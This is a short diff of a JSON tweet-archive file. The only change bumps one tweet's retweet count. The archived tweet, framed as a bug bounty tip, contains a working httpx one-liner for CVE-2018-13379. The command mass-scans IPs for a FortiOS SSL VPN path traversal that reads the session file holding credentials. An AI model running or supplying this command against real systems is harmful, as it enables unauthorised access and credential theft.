@@ -293,7 +293,7 @@
     "tweetfavorites": 391,
     "tweetquotes": 0,
     "tweetreplies": 6,
-    "tweetretweets": 113,
+    "tweetretweets": 114,
     "tweettext": "Title :- A path traversal vulnerability in the FortiOS SSL VPN web portal  CVE-2018-13379 🪲\n\n httpx -l ips.txt -path \"/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession\" -status-code -mc 200\n\n#BugBounty #bugbountytip #bugbountytips #Hacking #CyberSecurity https://t.co/pKp3NHlAOt",
     "tweettime": "2023-07-07, 08:38:53",
     "tweeturl": "https://twitter.com/TheMsterDoctor1/status/1677235726088323074",
